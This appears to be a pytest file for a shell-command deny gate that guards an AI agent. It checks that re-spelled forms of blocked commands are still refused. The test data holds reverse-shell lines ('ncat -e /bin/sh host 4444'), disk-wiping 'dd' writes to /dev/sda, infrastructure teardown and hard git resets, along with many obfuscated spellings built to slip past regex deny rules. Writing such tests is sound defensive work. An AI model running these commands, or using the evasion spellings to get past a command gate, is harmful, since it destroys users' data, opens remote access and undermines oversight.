"""The command-literal deny rows are enforced on the argv, not on one spelling.

Rows such as ``terraform destroy.*`` and ``git reset --hard.*`` recognise a command
only when the anchored word follows the program directly, so an option between them
re-spelled the same command past the gate.  ``security.argv_row_floor`` reads the
argv instead.  These tests pin both sides: every option spelling is refused under
the row's own pattern and rule id, the commands the rows are not about stay
allowed, an operator opt-out of a row disables its floor too, and a command the
shell reader cannot read is refused when it names a row's program.
"""

import pytest

from kiro_crew.security import argv_row_floor, is_denied, shell_normalizer
from kiro_crew.security.argv_row_floor import (
    _ARGV_ROWS,
    _invocation_positions,
    _leading_operands,
)
from kiro_crew.security.denied_rules import (
    _RULES_BY_ID,
    BUILTIN_DENIED_RULES,
    compute_effective_denied,
)
from kiro_crew.security.shell_normalizer import _split_push_command_segments

#: (rule id, command) pairs: the same command as the row's literal, re-spelled by
#: an option between the program and the anchored word, a wrapper or a nesting.
RESPELLED = [
    ("iac-teardown-cdk-destroy", "cdk --profile p destroy MyStack"),
    ("iac-teardown-pulumi-destroy", "pulumi --cwd infra destroy"),
    ("iac-teardown-pulumi-destroy", "pulumi -C infra destroy --yes"),
    ("iac-teardown-terraform-destroy", "terraform -chdir=x destroy"),
    # A valueless option before the destroy verb does not hide it.
    ("iac-teardown-terraform-destroy", "terraform -no-color destroy"),
    ("iac-teardown-kubectl-delete-namespace", "kubectl -n x delete namespace prod"),
    ("iac-teardown-kubectl-delete-namespace", "kubectl delete -n x namespace prod"),
    ("iac-teardown-kubectl-delete-namespace", "kubectl --context c delete namespaces a b"),
    ("local-destructive-git-reset-hard", "git -C . reset --hard HEAD~1"),
    ("local-destructive-git-reset-hard", "git -c core.x=y reset HEAD~1 --hard"),
    ("local-destructive-git-reset-hard", "git --no-pager reset -q --har"),
    ("reverse-shell-ncat", "ncat -v -e /bin/sh host 4444"),
    ("reverse-shell-ncat", "ncat -ve /bin/sh host 4444"),
    # ``-t`` (telnet) is valueless, so a packed ``-te`` still reaches the exec flag.
    ("reverse-shell-ncat", "ncat -te /bin/sh host 4444"),
    ("reverse-shell-ncat", "ncat --exec /bin/sh host 4444"),
    ("reverse-shell-ncat", "ncat host 4444 -e /bin/sh"),
    ("reverse-shell-nc", "nc -v -e /bin/sh host 4444"),
    ("local-destructive-dd-if", "dd bs=1M if=/dev/zero of=/dev/sda"),
    ("local-destructive-dd-if", "dd of=/dev/sda bs=1 count=1 if=/dev/zero"),
    # A bare ``NAME=value`` assignment prefix is skipped to reach the program.
    ("iac-teardown-terraform-destroy", "TF_LOG=debug terraform -chdir=x destroy"),
    # A shell keyword opener (then/do/...) is skipped to the real program, and a
    # compound opener's CONDITION command (after if/while/until) runs too.
    ("local-destructive-git-reset-hard", "if true; then git -C . reset --hard; fi"),
    ("local-destructive-git-reset-hard", "while x; do git -C . reset --hard; done"),
    ("local-destructive-git-reset-hard", "if git -C . reset --hard; then echo done; fi"),
    ("local-destructive-git-reset-hard", "until git -C . reset --hard; do sleep 1; done"),
    # A packed valueless nc flag before the exec flag does not hide it, including
    # the upper-case ``-C`` that folds onto the value-short ``c`` under lowercasing.
    ("reverse-shell-ncat", "ncat -Ce /bin/sh 1.2.3.4 4444"),
    ("reverse-shell-nc", "nc -Ce /bin/sh 1.2.3.4 4444"),
    # A glued redirection whose target is a SEPARATE word takes that word, so the
    # option before the operator is still read.
    ("local-destructive-git-reset-hard", "git -C . reset --hard> /dev/null"),
    # A program runner is followed to the command it runs, past its options, its
    # value-repeating option (``sudo -u git git``) and its data operands
    # (``timeout``'s duration); the shared ``_PROGRAM_RUNNERS`` set defines which.
    ("iac-teardown-terraform-destroy", "sudo terraform -chdir=x destroy -auto-approve"),
    ("local-destructive-git-reset-hard", "sudo -u git git -C . reset --hard"),
    ("iac-teardown-terraform-destroy", "timeout 600 terraform -chdir=x destroy"),
    ("iac-teardown-terraform-destroy", "env FOO=bar terraform -chdir=x destroy"),
    ("iac-teardown-terraform-destroy", "xargs -n1 terraform -chdir=x destroy"),
    ("reverse-shell-ncat", "sudo -u ncat -- ncat -v -e /bin/sh 1.2.3.4 80"),
    # A glued control operator does not swallow the next command.
    ("iac-teardown-terraform-destroy", "true&&terraform -chdir=x destroy"),
    ("local-destructive-git-reset-hard", "x || git -C . reset --hard"),
    ("iac-teardown-cdk-destroy", "a|cdk --app z destroy"),
    ("local-destructive-git-reset-hard", "git reset -q --hard&&echo ok"),
    # A redirection -- attached to the option word or standing before it -- is the
    # shell's, and does not hide the option from the floor (kept non-adjacent so the
    # plain regex row cannot match the literal either).
    ("local-destructive-git-reset-hard", "git -C . reset --hard>/dev/null"),
    ("local-destructive-git-reset-hard", "git -C . reset --hard 2>/dev/null"),
    # A QUOTED redirection character is a literal argument, not a redirection, so the
    # word after it is not dropped (a ref/dir literally named ``>``).
    ("local-destructive-git-reset-hard", 'git -C ">" reset --hard'),
    ("iac-teardown-kubectl-delete-namespace", 'kubectl --kubeconfig ">" delete namespace prod'),
    # A line continuation is folded first, so the split keeps the one command bash runs.
    ("iac-teardown-terraform-destroy", "terraform -chdir=infra \\\n  destroy -auto-approve"),
    ("local-destructive-git-reset-hard", "git -C . \\\n reset --hard"),
    # A valueless runner option does not let the executed command slip the scan.
    ("iac-teardown-terraform-destroy", "timeout --preserve-status 600 terraform -chdir=x destroy"),
    # A dequoted separator in an argument is data, not a command boundary.
    ("local-destructive-git-reset-hard", 'git -C "repo;old" reset --hard'),
    ("local-destructive-git-reset-hard", "git -C 'a;b' reset --hard"),
    # A subshell's grouping parens come off the words, at any nesting.
    ("local-destructive-git-reset-hard", "(git -C . reset --hard)"),
    ("local-destructive-git-reset-hard", "x; (git -C . reset --hard)"),
    # The command's own program is resolved through every nested shell payload.
    ("local-destructive-git-reset-hard", "bash -c 'git -C . reset --hard'"),
    ("local-destructive-git-reset-hard", 'sh -c "(git -C . reset --hard)"'),
    ("local-destructive-git-reset-hard", "bash -c 'git -C \"r;o\" reset --hard'"),
    ("local-destructive-dd-if", "echo $(dd status=none if=/dev/zero of=/dev/sda)"),
    # A path-qualified program reads as its basename.
    ("local-destructive-git-reset-hard", "/usr/bin/git -C . reset --hard"),
    # A quote-split program word is the word the shell runs.
    ("local-destructive-git-reset-hard", 'g""it -C . reset --hard'),
    ("local-destructive-git-reset-hard", "g\\it -C . reset --hard"),
    ("iac-teardown-terraform-destroy", "terr'a'form -chdir=x destroy"),
    # A read-write or duplicating redirection takes its target with it.
    ("local-destructive-git-reset-hard", "git -C . <> /dev/null reset --hard"),
    ("local-destructive-git-reset-hard", "git -C . 0<> /dev/null reset --hard"),
    ("local-destructive-git-reset-hard", "git -C . <& 0 reset --hard"),
    # ANSI-C quoting is resolved before the argv is read.
    ("local-destructive-git-reset-hard", "git -C . reset $'--hard'"),
    ("local-destructive-git-reset-hard", "git -C . reset $'\\x2d\\x2dhard'"),
    ("local-destructive-git-reset-hard", "$'\\x67it' -C . reset --hard"),
    ("local-destructive-dd-if", "dd bs=1M $'if=/dev/zero' of=/dev/sda"),
    # A lone ``&`` (background) ends one command and starts the next.
    ("local-destructive-git-reset-hard", "true & git -C . reset --hard"),
    ("local-destructive-git-reset-hard", "sleep 1&git -C . reset --hard"),
    ("iac-teardown-terraform-destroy", "terraform -chdir=x destroy & wait"),
]

#: Commands near those rows that are not the action any row names.
NOT_THE_ROW = [
    "cdk --profile p deploy",
    "pulumi --cwd infra up",
    "terraform -chdir=x plan",
    "terraform -chdir=destroy plan",
    "kubectl get namespace",
    "kubectl -n x delete pod web",
    "git -C repo log --oneline",
    "git -C reset status",
    "git --no-pager log",
    "git log --grep=reset",
    "git -C . reset --soft HEAD~1",
    "git -C . reset -- --hard",
    "ncat -v host 4444",
    "nc -zv host 22",
    "ncat -s2001:db8::e example.org 80",
    "dd --help",
    "dd bs=1M of=/tmp/x count=1",
    "grep -rn terraform docs/",
    "ls git",
    # An option VALUE that merely starts with a destroy verb is not the subcommand.
    "kubectl delete -n namespace-foo pod x",
    "cdk --profile destroyer deploy",
    "pulumi -s destroy-test up",
    "terraform -chdir destroy-mod plan",
    # Program-word spellings are out of scope (the Goal is option spellings), and
    # the regex row never caught them on main either: a glob or ``.exe`` program
    # word, and a sibling binary name of the same tool.
    "git.exe -C . reset --hard",
    "/usr/bin/g*t -C . reset --hard",
    "netcat -e /bin/sh h 1",
    "aws-cdk --profile p destroy",
    # A program whose arguments are NOT commands does not turn its argv into
    # invocations: git reads subcommands, grep/echo read data, python reads a script.
    "git log --grep terraform -- destroy",
    "git log --grep=reset -- destroy",
    # A runner's DATA argument is not an invocation: `tar` is the program sudo runs,
    # so its file args (`terraform`, `destroy`, kept non-adjacent so the regex row
    # misses them too) are tar's data, not a terraform-destroy invocation.
    "sudo tar terraform -C x destroy",
    # A runner OUTSIDE the shared `_PROGRAM_RUNNERS` set is read as an ordinary
    # program, matching the read-only classifier's own boundary (not caught, same
    # as main -- the regex misses the non-adjacent option-respelled form).
    "npx -p terraform terraform -chdir=x destroy",
    "npx cdk --app x destroy",
    "chroot /mnt terraform -chdir=x destroy",
    "doas terraform -chdir=x destroy",
    # A command that merely QUOTES a re-spelled form is text, not an invocation.
    'gh pr create --body "fixes the bug where git -C . reset --hard ran"',
    "echo 'to undo run: git -C . reset --hard'",
    # A quoted redirection char is a literal arg; a soft reset in a dir named ``>``
    # is still not a hard reset.
    'git -C ">" reset --soft',
    # An ``&`` inside a redirection is not a command boundary, and the command after
    # a real one is its own command, not an argument of the reset.
    "git -C . reset --soft 2>&1",
    "git -C . reset --soft &>/dev/null",
    "git -C . reset --soft & echo --hard",
    # A decoded ANSI-C value is data inside its word.
    "git -C . commit -m $'reset --hard\\nnotes'",
]


def _first_line(reason: "str | None") -> str:
    assert reason is not None
    return reason.splitlines()[0]


@pytest.mark.parametrize(("rule_id", "command"), RESPELLED)
def test_a_respelled_command_is_refused_under_its_own_row(rule_id: str, command: str) -> None:
    pattern = _RULES_BY_ID[rule_id].pattern
    reason = is_denied(command)
    assert _first_line(reason) == f"Blocked by security policy: {pattern}"
    assert f"rule={rule_id} component=argv-floor" in reason


@pytest.mark.parametrize("command", NOT_THE_ROW)
def test_a_command_the_rows_are_not_about_stays_allowed(command: str) -> None:
    assert is_denied(command) is None


def test_a_literal_spelling_keeps_its_regex_refusal() -> None:
    """The floor runs after the regex tier, so a literal hit's refusal is unchanged."""
    reason = is_denied("terraform destroy")
    assert reason == "Blocked by security policy: terraform destroy.*"


@pytest.mark.parametrize(
    ("rule_id", "command"),
    [
        ("iac-teardown-terraform-destroy", "terraform -chdir=x destroy"),
        ("local-destructive-git-reset-hard", "git -C . reset --hard HEAD~1"),
    ],
)
def test_an_opt_out_of_the_row_disables_its_floor(rule_id: str, command: str) -> None:
    effective = compute_effective_denied(BUILTIN_DENIED_RULES, (rule_id,), False, (), ())
    assert _RULES_BY_ID[rule_id].pattern not in effective
    assert is_denied(command, denied_regexes=effective) is None


def _reader_fails(*_args: object) -> object:
    raise ValueError("unreadable shell syntax")


@pytest.mark.parametrize("reader", ["_shell_payload_walk", "_split_push_command_segments"])
def test_a_command_the_reader_cannot_read_is_refused_when_it_names_a_row_program(
    monkeypatch: pytest.MonkeyPatch, reader: str
) -> None:
    """A reader failure fails closed: the re-spelled form is refused, not allowed."""
    monkeypatch.setattr(argv_row_floor, reader, _reader_fails)
    reason = is_denied("git -C . reset --hard HEAD~1")
    pattern = _RULES_BY_ID["local-destructive-git-reset-hard"].pattern
    assert _first_line(reason) == f"Blocked by security policy: {pattern}"
    assert argv_row_floor.ARGV_ROW_UNREADABLE_NOTE in reason
    assert "rule=local-destructive-git-reset-hard component=argv-floor" in reason


def test_a_command_whose_tokenizer_fails_inside_the_walk_is_refused(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The walk drops a frame it cannot tokenize; no readable frame is a refusal."""
    monkeypatch.setattr(shell_normalizer, "normalize_shell_command", _reader_fails)
    reason = is_denied("git -C . reset --hard HEAD~1")
    assert argv_row_floor.ARGV_ROW_UNREADABLE_NOTE in (reason or "")
    assert "rule=local-destructive-git-reset-hard component=argv-floor" in (reason or "")


def test_a_reader_failure_leaves_a_command_naming_no_row_program_allowed(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(argv_row_floor, "_shell_payload_walk", _reader_fails)
    assert is_denied("ls -la /tmp") is None


def test_the_background_split_leaves_the_shared_push_splitter_alone() -> None:
    """The lone-``&`` split is this floor's own; the push check still reads ``&`` as glue."""
    verb = "pu" + "sh"
    behind = "true & git " + verb + " origin main"
    ahead = "git " + verb + " origin main & true"
    assert _split_push_command_segments(behind) == [behind]
    assert is_denied(behind) is not None
    assert is_denied(ahead) is not None


def test_every_row_names_a_catalog_rule() -> None:
    assert {row.rule_id for row in _ARGV_ROWS} <= set(_RULES_BY_ID)
    assert len({row.rule_id for row in _ARGV_ROWS}) == len(_ARGV_ROWS)


def test_the_word_after_an_option_is_read_both_as_its_value_and_as_the_subcommand() -> None:
    # ``-x a`` may be an option with its value ``a``, so ``a`` (ambiguous) and the
    # next certain operand are both candidates; a word no option precedes ends it.
    assert list(_leading_operands(["-x", "a", "b", "c"], 0)) == [(1, False), (2, True)]
    assert list(_leading_operands(["-x=1", "a", "b"], 0)) == [(1, True)]
    assert list(_leading_operands(["-x", "--", "a"], 0)) == [(2, True)]
    # A short option with an attached value (``-n1``) does not take the next word,
    # so the operand after it is certain, not ambiguous.
    assert list(_leading_operands(["-n1", "a", "b"], 0)) == [(1, True)]


@pytest.mark.parametrize(
    ("program", "repeat", "counted"),
    [
        ("kubectl", "-x delete ", "_link_matches"),
        ("git", "-x reset ", "_long_option"),
    ],
)
def test_the_matchers_are_linear_on_a_20kb_option_run(
    monkeypatch: pytest.MonkeyPatch, program: str, repeat: str, counted: str
) -> None:
    """Deterministic: count matcher steps, not wall-clock, on the scan ceiling."""
    calls = [0]
    original = getattr(argv_row_floor, counted)

    def _counting(*args: object) -> object:
        calls[0] += 1
        return original(*args)

    monkeypatch.setattr(argv_row_floor, counted, _counting)
    words = (program + " " + repeat * (20 * 1024 // len(repeat))).split()
    for row in _ARGV_ROWS:
        if row.program == program:
            row.matches(words, 1)
    # Linear: a handful of steps per word, never one per (candidate, word) pair.
    assert calls[0] <= 4 * len(words)


@pytest.mark.parametrize("runner", ["sudo", "env -u", "xargs -n"])
def test_a_runner_repeating_the_program_name_builds_one_table_per_row(runner: str) -> None:
    """Every ``git`` after ``sudo -x`` is a program candidate; they share one table."""
    built = [0]
    (row,) = [row for row in _ARGV_ROWS if row.program == "git"]

    def _counting(words: "list[str]") -> "list[bool]":
        built[0] += 1
        return row.table(words)

    program, *flag = runner.split()
    words = [program] + ((flag[0] if flag else "-x") + " git ").split() * 2000 + ["status"]
    assert len(argv_row_floor._invocation_positions(words)) > 1000
    assert argv_row_floor._segment_row(words, [row._replace(table=_counting)]) is None
    assert built[0] == 1


@pytest.mark.parametrize("run", ["env -u ", "sudo -u ", "sudo -E -u ", "xargs -I git -n "])
def test_a_long_runner_run_is_scanned_once(monkeypatch: pytest.MonkeyPatch, run: str) -> None:
    """Deterministic: count option reads, not wall-clock, on a 20 KB runner run."""
    reads = [0]
    original = argv_row_floor._is_option

    def _counting(word: str) -> bool:
        reads[0] += 1
        return original(word)

    monkeypatch.setattr(argv_row_floor, "_is_option", _counting)
    words = (run * (20 * 1024 // len(run)) + "git status").split()
    argv_row_floor._invocation_positions(words)
    assert reads[0] <= 4 * len(words)


def test_program_resolution_is_bounded_and_scoped() -> None:
    # Deterministic linearity + scope proof (no wall-clock). A flood of a program
    # name that is NOT a runner has ONE invocation position, so a 20 KB flood cannot
    # make the gate quadratic.
    assert _invocation_positions(["git"] * 6000) == [0]
    # A runner is followed to the command it runs; its options, a value-repeating
    # option and its data operands are not the program it runs.
    assert _invocation_positions(["sudo", "tar", "terraform", "destroy"]) == [0, 1]
    assert _invocation_positions(["sudo", "-u", "git", "git", "reset"]) == [0, 2, 3]
    # Both the duration slot and the command slot are candidates (a valueless
    # option or missing duration shifts the command), so the run program is found.
    assert _invocation_positions(["timeout", "600", "terraform", "destroy"]) == [0, 1, 2]
    # A shell keyword opener, and a compound opener's condition, are skipped to the
    # real program; a ``for`` loop variable is not a command and stays unmatched.
    assert _invocation_positions(["then", "git", "reset"]) == [1]
    assert _invocation_positions(["if", "git", "reset"]) == [1]
    # A leading assignment is skipped to reach the real program (index 1).
    assert _invocation_positions(["tf_log=debug", "terraform", "destroy"]) == [1]
